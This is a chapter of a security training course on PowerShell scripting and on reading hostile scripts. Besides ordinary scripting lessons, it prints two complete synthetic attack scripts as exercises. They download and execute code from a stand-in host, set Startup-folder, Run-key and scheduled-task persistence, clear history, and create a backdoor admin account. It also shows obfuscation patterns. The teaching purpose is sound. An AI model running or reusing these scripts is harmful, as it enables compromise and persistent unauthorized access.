# Chapter 9: PowerShell Scripting

**You come in with:** Chapter 2's PowerShell foundations: profiles, parameters, error handling at survival depth. The workshop's small script.
**You leave with:** the ability to write a wrapper script with proper structure (parameters, validation, error handling), read someone else's script and figure out what it does, and recognize the patterns that distinguish ordinary PowerShell from malicious PowerShell.

**Time:** 60 to 90 minutes including the exercises.

**Security+ alignment:** Domain 2.4 (indicators of malicious activity: malicious code, including scripts and obfuscated PowerShell). Domain 4.5 (operating system security: PowerShell logging, AMSI). Domain 4.7 (automation and orchestration: scripts as automation primitives). Domain 5.4 (security awareness practices: recognition of suspicious code). The "read this script and find what is wrong with it" exercise in this chapter is the practical version of analyzing scripts during incident response.

---

## Why this chapter is shaped this way

Same framing as the Linux scripting chapter. The audience is sysadmins and security professionals, not application developers. You will read more PowerShell than you will write. Some of it will be hostile.

The reframing: priority is reading skill plus enough writing skill to wrap three commands with proper error handling. That is the realistic working-admin shape. PowerShell is glue. Anything substantial gets written in C#, Python, or Go. PowerShell scripts are wrappers around existing tools, automation hooks, and quick adapters between systems.

Two things this chapter does that most do not. First, it spends meaningful time on reading scripts adversarially with PowerShell-specific obfuscation patterns. Second, the writing exercises are wrapper-shaped rather than CLI-application-shaped. The skill is "I can read what is on a system I did not build, and I can wrap three commands into a reliable script." Anything past that, you should be reaching for a real programming language.

PowerShell is also the most common attacker tool on Windows. The intermediate cohort goes deep on detection. This chapter is the foundation.

---

## The minimum viable script

A PowerShell script is a `.ps1` file containing PowerShell statements. The first lines are typically directives, then the safety preamble, then the work.

```powershell
#Requires -Version 5.1
#Requires -RunAsAdministrator

$ErrorActionPreference = 'Stop'

Write-Host "Hello from PowerShell"
```

Save as `C:\AppData\webops\hello.ps1`. Run it:

```
C:\AppData\webops\hello.ps1
```

If you have not configured the execution policy yet, the script fails with "running scripts is disabled on this system." Fix once:

```
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Then re-run.

### The directives

`#Requires` is PowerShell's equivalent of bash's shebang plus a feature gate.

- `#Requires -Version 5.1` makes the script refuse to run on PowerShell older than 5.1.
- `#Requires -RunAsAdministrator` makes the script refuse to run unless elevated.
- `#Requires -Modules <name>` makes the script refuse to run unless the module is available.

These checks happen before any code runs. They are cheap and prevent half the "this script worked on my machine" surprises.

### The safety preamble

`$ErrorActionPreference = 'Stop'` is the rough equivalent of `set -e` from bash. It changes the default error behavior from "log and continue" to "throw an exception that stops the script."

Without it, a script that hits a non-terminating error keeps going, often producing wrong output silently. With it, errors abort. Always include it for any script that matters.

For more granular control, you can override per-cmdlet:

```powershell
$ErrorActionPreference = 'Stop'    # default for the script

# But this specific call should swallow errors
Get-Item C:\maybe-missing -ErrorAction SilentlyContinue
```

### Comments and structure

```powershell
# Single-line comment

<#
Multi-line comment.
Spans many lines.
#>

<#
.SYNOPSIS
    A one-line description.
.DESCRIPTION
    A longer description.
.PARAMETER InputPath
    The path to process.
.EXAMPLE
    .\script.ps1 -InputPath C:\Logs
#>
```

The third form is a "comment-based help" block. PowerShell parses it into proper help, so users can run `Get-Help .\script.ps1` and get a real help screen. This is a real practitioner habit; scripts you ship to others should have this block.

---

## Parameters

A script becomes useful when it takes parameters. PowerShell has a rich parameter system worth learning.

### The basics

```powershell
param(
    [string]$Name,
    [int]$Count = 5,
    [switch]$Verbose
)

Write-Host "Hello $Name $Count times"
if ($Verbose) {
    Write-Host "(verbose mode)"
}
```

Reading this:

- `param()` block at the top of the script declares parameters.
- Each parameter has a type and an optional default.
- `[switch]` is a flag (no value, presence is the value).

Run:

```
.\script.ps1 -Name Steven
.\script.ps1 -Name Steven -Count 10
.\script.ps1 -Name Steven -Verbose
```

### Validation attributes

PowerShell can validate parameters before the script body runs. Useful attributes:

```powershell
param(
    [Parameter(Mandatory)]
    [string]$Name,

    [ValidateRange(1, 100)]
    [int]$Count = 5,

    [ValidateSet('Info', 'Warn', 'Error')]
    [string]$Level = 'Info',

    [ValidateScript({ Test-Path $_ })]
    [string]$InputPath,

    [ValidatePattern('^[a-z0-9-]+$')]
    [string]$ServiceName
)
```

Reading these:

- **Mandatory**: PowerShell prompts if the parameter is missing.
- **ValidateRange**: number must be in the range.
- **ValidateSet**: value must be one of the listed strings.
- **ValidateScript**: the script block must return true. Useful for "the path must exist" checks.
- **ValidatePattern**: value must match the regex.

Validation runs before any of the script body. Bad input is caught early with a clean error message rather than mysterious failure midway through.

### Parameter sets

When a script takes mutually-exclusive parameter combinations, parameter sets express the rules:

```powershell
param(
    [Parameter(Mandatory, ParameterSetName='ByName')]
    [string]$Name,

    [Parameter(Mandatory, ParameterSetName='ById')]
    [int]$Id
)
```

The script can be called with `-Name <value>` or `-Id <value>`, but not both. PowerShell enforces this at the parameter binding stage.

For most scripts, a single parameter set is fine. Parameter sets become useful for tools that have several distinct invocation modes.

---

## Functions

Once a script has more than 30 lines, breaking it into functions is the right move.

```powershell
function Get-SystemSummary {
    param(
        [string]$ComputerName = $env:COMPUTERNAME
    )

    $os = Get-CimInstance Win32_OperatingSystem -ComputerName $ComputerName
    $cpu = Get-CimInstance Win32_Processor -ComputerName $ComputerName

    [PSCustomObject]@{
        ComputerName = $ComputerName
        OSName = $os.Caption
        OSVersion = $os.Version
        Uptime = (Get-Date) - $os.LastBootUpTime
        CPU = $cpu.Name
        TotalRAM_GB = [math]::Round($os.TotalVisibleMemorySize / 1MB, 2)
    }
}

# Use the function
Get-SystemSummary
Get-SystemSummary -ComputerName labbox
```

Reading the function:

- `function Name-Verb` declares the function with the verb-noun convention.
- `param()` block inside the function works the same way as in scripts.
- The function returns whatever objects it produces. Here, one PSCustomObject.

Functions defined in a script are local to the script. Functions defined in your `$PROFILE` are available everywhere. Functions intended for distribution go into modules.

### Advanced functions

For more sophisticated functions, the `[CmdletBinding()]` attribute promotes a function to "advanced function" status, giving it access to common parameters like `-Verbose`, `-Debug`, `-ErrorAction`:

```powershell
function Get-SystemSummary {
    [CmdletBinding()]
    param(
        [string]$ComputerName = $env:COMPUTERNAME
    )

    Write-Verbose "Querying $ComputerName"
    # ... rest of the function
}

# Now this works:
Get-SystemSummary -Verbose
```

For most scripts you write, `[CmdletBinding()]` plus a `param()` block plus careful use of `Write-Verbose` for tracing is the right shape. Once you have that, your function looks and feels like a real cmdlet.

---

## A real wrapper script: putting it together

The exercise: write a script that backs up a directory, with proper structure.

```powershell
<#
.SYNOPSIS
    Backs up a directory to a timestamped zip file.
.DESCRIPTION
    Creates a zip archive of the source directory in the destination directory,
    with a timestamp in the filename. Removes archives older than the retention period.
.PARAMETER Source
    The directory to back up.
.PARAMETER Destination
    The directory to write archives to. Created if it does not exist.
.PARAMETER RetentionDays
    Archives older than this many days are removed. Defaults to 7.
.EXAMPLE
    .\Backup-Directory.ps1 -Source C:\AppData\webops -Destination C:\Backups
#>

#Requires -Version 5.1

[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [ValidateScript({ Test-Path $_ -PathType Container })]
    [string]$Source,

    [Parameter(Mandatory)]
    [string]$Destination,

    [ValidateRange(1, 365)]
    [int]$RetentionDays = 7
)

$ErrorActionPreference = 'Stop'

# Helper functions
function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Write-Host "[$stamp] [$Level] $Message"
}

# Setup
if (-not (Test-Path $Destination)) {
    Write-Log "Creating destination directory: $Destination"
    New-Item -ItemType Directory -Path $Destination -Force | Out-Null
}

# Build the archive name
$timestamp = Get-Date -Format 'yyyy-MM-dd_HHmm'
$sourceName = (Get-Item $Source).Name
$archivePath = Join-Path $Destination "$sourceName-$timestamp.zip"

# Do the work
Write-Log "Backing up $Source to $archivePath"
try {
    Compress-Archive -Path $Source -DestinationPath $archivePath -CompressionLevel Optimal
    $size = (Get-Item $archivePath).Length / 1MB
    Write-Log ("Backup complete. Size: {0:N2} MB" -f $size)
} catch {
    Write-Log "Backup FAILED: $_" -Level ERROR
    if (Test-Path $archivePath) {
        Remove-Item $archivePath -Force
    }
    exit 2
}

# Cleanup old backups
Write-Log "Cleaning up archives older than $RetentionDays days"
$cutoff = (Get-Date).AddDays(-$RetentionDays)
$old = Get-ChildItem $Destination -Filter "$sourceName-*.zip" |
    Where-Object LastWriteTime -lt $cutoff
foreach ($f in $old) {
    Write-Log "Removing $($f.Name)"
    Remove-Item $f.FullName -Force
}

Write-Log "Done."
```

What this script does well:

- **Comment-based help** at the top. `Get-Help .\Backup-Directory.ps1 -Full` works.
- **Parameter validation**: source must be an existing directory, retention must be 1-365.
- **`#Requires` directive** for version check.
- **`$ErrorActionPreference = 'Stop'`** as the safety preamble.
- **Helper function** for logging with timestamps.
- **Try/catch** around the destructive operation, with cleanup on failure.
- **Distinct exit code** on failure.
- **Cleanup loop** to prevent unbounded archive growth.

This is roughly the maximum complexity worth doing in PowerShell. Beyond this size, switch to a real language.

---

## Reading scripts adversarially

Half of this chapter's value is reading skill, not writing skill. PowerShell is the most common Windows attacker tool because:

- It is on every modern Windows by default.
- It speaks .NET fluently, which means almost everything is reachable.
- It can run code without writing files to disk.
- It has historically been less audited than EXE-based attacks.

Reading PowerShell adversarially is a skill SOC analysts and IR analysts use constantly.

### The mental model for reading any script

1. **What does the `#Requires` line say?** Some scripts gate on admin rights or specific module versions; this tells you what they need.
2. **Is there `$ErrorActionPreference = 'Stop'`?** Production scripts usually have it. Scripts that intentionally swallow errors often do not. Either is informative.
3. **What `param()` block is at the top?** This is the script's interface; it tells you how it is invoked.
4. **What is the main flow?** Read the bottom of the script first. Helper functions go up top; the actual work goes at the end.
5. **What does it run as a child process?** `Start-Process`, `Invoke-Expression`, `& <command>`, `cmd /c`, `powershell -Command`. Each is a potential code-execution boundary.
6. **What does it download?** `Invoke-WebRequest`, `Invoke-RestMethod`, `(New-Object Net.WebClient).DownloadString()`, `[System.Net.WebRequest]`. Each is a network request.
7. **What does it write to the filesystem?** `Out-File`, `Set-Content`, `Add-Content`, `Copy-Item`. Each modifies the system.
8. **What does it modify in the registry?** `Set-ItemProperty`, `New-Item -Path HKLM:`, `reg add`. Persistence, configuration, evasion.
9. **Does it cover its tracks?** `Clear-History`, `Remove-Item .ps1`, `Set-PSReadlineOption -HistorySaveStyle SaveNothing`. These are evasion tells.

### A script worth reading

Read this script. Take a minute before reading the analysis below.

```powershell
$wc = New-Object Net.WebClient
$payload = $wc.DownloadString("http://198.51.100.42/p.ps1")
Invoke-Expression $payload

$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1"
$payload | Out-File -FilePath $startup

Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-History

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $startup" /f

$user = New-Object System.Security.Principal.NTAccount("support")
[void](New-LocalUser -Name "support" -Password (ConvertTo-SecureString "Pass1234!" -AsPlainText -Force) -PasswordNeverExpires)
Add-LocalGroupMember -Group "Administrators" -Member "support"
```

What is wrong with it? Walk through line by line.

`$wc = New-Object Net.WebClient` plus `$wc.DownloadString("http://...")` plus `Invoke-Expression $payload`: this is the canonical "download and execute" PowerShell idiom. The HTTP URL fetches arbitrary code, then `Invoke-Expression` runs it. This is the textbook compromise pattern. MITRE ATT&CK T1059.001 (Command and Scripting Interpreter: PowerShell).

`$payload | Out-File ... Startup\update.ps1`: writing the same payload to the user's Startup folder. Anything in the Startup folder runs at logon. This is persistence. ATT&CK T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder).

`Set-PSReadlineOption -HistorySaveStyle SaveNothing` plus `Clear-History`: this disables PowerShell command history saving and clears the in-memory history. Anti-forensics. ATT&CK T1070.003 (Indicator Removal: Clear Command History).

The `reg add` line: writes a Run key in the registry for the current user. Same script (`update.ps1`) starts at every logon, with `-ExecutionPolicy Bypass -WindowStyle Hidden` flags. This is a second layer of persistence (defense in depth from the attacker's perspective). ATT&CK T1547.001 (same technique, different sub-technique mechanic).

The `New-LocalUser` plus `Add-LocalGroupMember Administrators` lines: creates a local administrator account named "support" with a known password. This is a backdoor account. ATT&CK T1136.001 (Create Account: Local Account) and T1078.003 (Valid Accounts: Local Accounts).

This 12-line script does five things wrong, each of which would be caught by basic PowerShell logging or AMSI scanning. Run on a real system without those, it is a textbook compromise.

The skill: noticing each pattern. The `Net.WebClient`/`Invoke-Expression` pair, the Startup folder persistence, the Run key persistence, the history clearing, the local admin creation. Practice on real (sanitized) examples is the only way to build it.

We come back to this in Chapter 11 with more depth.

### Less obviously hostile patterns

Real malicious PowerShell hides better. Patterns to recognize:

**Encoded payloads.**

```powershell
powershell -EncodedCommand <base64>
$cmd = [Convert]::FromBase64String("...")
[Text.Encoding]::Unicode.GetString($cmd) | Invoke-Expression
```

PowerShell accepts `-EncodedCommand` as a way to pass a script via base64. Attackers love this because it avoids quoting issues and makes signature-based detection harder. To analyze, decode the base64 and read the result.

```powershell
$encoded = "UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQA="
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

That decodes to "Set-ItemProperty". Real samples have larger payloads.

**Obfuscated variable names and string concatenation.**

```powershell
$x1 = 'Inv'; $x2 = 'oke-Expr'; $x3 = 'ession'
$cmd = $x1 + $x2 + $x3
& $cmd "..."
```

The `&` call operator runs whatever string follows. Obfuscation hides the actual cmdlet from naive log parsing.

**.NET reflection.**

```powershell
[Reflection.Assembly]::LoadWithPartialName("System.Web") | Out-Null
[System.Web.Security.Membership]::GeneratePassword(...)
```

PowerShell can load arbitrary .NET assemblies and call into them. This is normal in legitimate scripts; it is also how attackers reach functionality not exposed in cmdlets.

**Constructed cmdlet calls.**

```powershell
$Get = Get-Command -CommandType Cmdlet | Where-Object Name -match 'Get-Item$'
& $Get $path
```

Using a variable to call a cmdlet, instead of the cmdlet name directly, hides the call from naive analysis.

**Null-byte string tricks and other parsing edge cases.**

PowerShell tolerates many syntactic transformations that preserve meaning but defeat regex-based detection. Real obfuscation tools (Invoke-Obfuscation, etc.) chain dozens of these.

### What to look for in real environments

When you investigate a Windows host:

- **PSReadLine history** (`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`) is a record of every PowerShell command typed by the user. Read it.
- **PowerShell logging events** in the event log (channels: Microsoft-Windows-PowerShell/Operational, Microsoft-Windows-PowerShell/Admin) record script invocations.
- **Event 4104** in the PowerShell Operational log captures actual script blocks executed (after de-obfuscation; this is the AMSI integration). High-value for investigation.

```
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath "*[System[(EventID=4104)]]" -MaxEvents 5 |
    Select-Object TimeCreated, Message
```

These are the artifacts a SOC analyst looks at first when investigating PowerShell-based attack. Chapter 11 goes deeper.

---

## PowerShell logging and AMSI

Two enforcement layers worth knowing about.

### Script block logging

When enabled, Windows captures the actual content of every PowerShell script block executed, including obfuscated or de-encoded forms. This is Event ID 4104 in the PowerShell Operational log.

To enable:

```powershell
$path = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
Set-ItemProperty -Path $path -Name 'EnableScriptBlockLogging' -Value 1
```

This is one of the highest-value defensive configurations on Windows for PowerShell-flavored attacks. Chapter 12 makes it part of the hardening baseline.

### AMSI

AMSI, the Antimalware Scan Interface, lets antivirus products scan script content at runtime. *AMSI exposes a Windows API that scanners can hook to inspect script-like content (PowerShell, JavaScript, VBScript) before the runtime executes it.* Modern Defender hooks PowerShell through AMSI.

The result: even base64-decoded, obfuscated PowerShell payloads are scanned by Defender at the point they actually execute, not just the form on disk. AMSI bypass techniques are a real category of attack precisely because AMSI's defensive value is real.

For most working admins, AMSI is invisible: it works in the background, blocking known-bad payloads. For security pros, AMSI is what catches the actual decoded content of obfuscated PowerShell at runtime, which is why attackers spend effort trying to bypass it.

### Constrained Language Mode

CLM (mentioned in Chapter 2) restricts PowerShell to a subset of features. When CLM is enforced via WDAC or AppLocker policies, the most powerful PowerShell techniques (.NET reflection, Add-Type, custom classes) become unavailable. This is genuine hardening for environments that can tolerate the application compatibility cost.

To check whether CLM is active:

```
$ExecutionContext.SessionState.LanguageMode
```

`FullLanguage` is normal; `ConstrainedLanguage` is CLM.

For this chapter, recognition is enough. Chapter 12 covers turning these on as part of hardening.

---

## Try this

**1. Write a wrapper script with proper structure.**

Pick a multi-step task you do regularly. Examples: "show the last 50 failed logons and their source IPs," "list the top 10 largest files under C:\Windows," "check whether Sysmon is running and report status with exit code." Write a script that does it.

Apply the conventions:

- Comment-based help block.
- `#Requires` directive.
- `[CmdletBinding()]` and `param()` block with at least one validated parameter.
- Safety preamble.
- Helper function for logging.
- Try/catch around at least one operation.
- Distinct exit codes for distinct failure modes.

Save as `C:\AppData\webops\yourscript.ps1`. Run it. Confirm it works. Run `Get-Help .\yourscript.ps1 -Full` and confirm the help block parses.

**2. Read a real script on your lab box.**

Find a script in `C:\Windows\System32\WindowsPowerShell\v1.0` or in any installed module. (Try `Get-Module Microsoft.PowerShell.LocalAccounts | Select-Object ModuleBase` to find the location of the LocalAccounts module.) Read one of the .psm1 or .ps1 files. Answer:

- What does the `#Requires` line say (if any)?
- What does the script's main entry look like?
- What does it modify (filesystem, registry, network)?
- What error handling does it use?

You do not need to understand every line. The goal is to confirm you can navigate someone else's PowerShell.

**3. Read this synthetic suspicious script and identify each finding.**

```powershell
$ErrorActionPreference = 'SilentlyContinue'

$dir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }

$payload = (Invoke-WebRequest -Uri "http://203.0.113.99/c.ps1" -UseBasicParsing).Content
$payload | Out-File -FilePath "$dir\service.ps1" -Encoding utf8

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $dir\service.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsCacheUpdater" -Action $action -Trigger $trigger -Principal $principal

Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-History
Remove-Item $MyInvocation.MyCommand.Path
```

Walk through it. For each line or block, identify what it does and whether it is a finding. There are at least five real findings here. Compare your analysis with the answer key at the end of this chapter (in your CourseStack notes).

**4. Decode an encoded payload.**

A small exercise in base64 decoding. Run this:

```powershell
$encoded = "RwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA="
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

Confirm the decoded result is `Get-Process -Name powershell`. Then verify that command would do something sensible if run.

This is the workflow for analyzing real `-EncodedCommand` payloads. Capture the base64 from a suspicious command line, decode it, read the result, decide if it is benign.

**5. Read your own PowerShell history.**

```
Get-Content (Get-PSReadLineOption).HistorySavePath | Select-Object -Last 50
```

That shows your last 50 PowerShell commands. Read them. This is what an investigator would see if they pulled this artifact from your machine.

If you see anything sensitive (passwords typed at a prompt, etc.), that itself is a learning moment about why typing secrets in clear text on the command line is a bad practice.

---

## Common stumbling blocks

> **My script works in PowerShell 7 but fails in 5.1.**
> Common cause: you used a feature added in 7+ (ternary operators `?:`, pipeline chain operators `&&`/`||`, ternary null-coalescing `??`). Add `#Requires -Version 7.0` if the script requires 7+, or rewrite for 5.1 compatibility. Most working admin tasks should target 5.1 because it is on every Windows by default.

> **`#Requires -RunAsAdministrator` does not stop a non-admin invocation.**
> The directive is checked when the script starts. If you ran the script with elevated privileges and `#Requires` is still failing, double-check the elevation. Run `whoami /groups | findstr "Mandatory"` to confirm you are at High Mandatory Level.

> **Parameter validation fails at runtime, not at parse time.**
> ValidateScript runs when the parameter is bound, not at parse time. If your validation script has a typo, you see the typo's error at invocation. Test validation scripts standalone first.

> **My try/catch does not catch the error.**
> The cmdlet generated a non-terminating error, which try/catch ignores. Either set `$ErrorActionPreference = 'Stop'` for the whole script, or add `-ErrorAction Stop` to the specific cmdlet inside the try block.

> **`Invoke-WebRequest` returns content but my script does not see the redirect.**
> By default, Invoke-WebRequest follows redirects automatically and shows you the final response. To inspect the redirect chain, use `-MaximumRedirection 0` and read the `Headers.Location` of the response.

> **Output from my script gets lost when run from a scheduled task.**
> Scheduled tasks do not have a console. Write-Host output goes nowhere. To capture: redirect output in the action's argument string (`-Command "&{ ... } *>> C:\Logs\out.log"`), or use Write-Verbose plus `-Verbose` and configure transcript logging in the script itself with `Start-Transcript`.

> **PowerShell history file grew huge or has commands I did not type.**
> History captures every command, including ones automatically loaded (profile init). Some PowerShell sessions also load a history from a previous session. The size is normal. If you see commands you do not recognize that look suspicious, treat that as a finding to investigate. Chapter 11 goes deeper.

---

## What this gets you

After this chapter:

- You can write a wrapper script with proper structure: directives, parameters with validation, safety preamble, helper functions, try/catch, distinct exit codes.
- You can read someone else's script and figure out what it does.
- You can recognize the major suspicious patterns: download-and-execute, base64 encoded commands, obfuscated cmdlet calls, history clearing, scheduled task persistence, account creation.
- You know about PowerShell script block logging (Event 4104) and AMSI as defensive layers.
- You know about Constrained Language Mode at recognition depth.
- You can decode a base64 PowerShell command for analysis.
- You can read your own PowerShell history file.

The reading-adversarially skill is the most important thing in this chapter. You will read more PowerShell than you write. Practice on the suspicious example. Chapter 11 deepens this with the artifact angle.

---

## What's next

Chapter 10 is Reading Windows processes. The chapter where Get-Process becomes serious skill, where signed binaries get explicit treatment, and where the Linux unit's process-investigation pattern gets translated to Windows tools including Process Explorer at recognition depth.
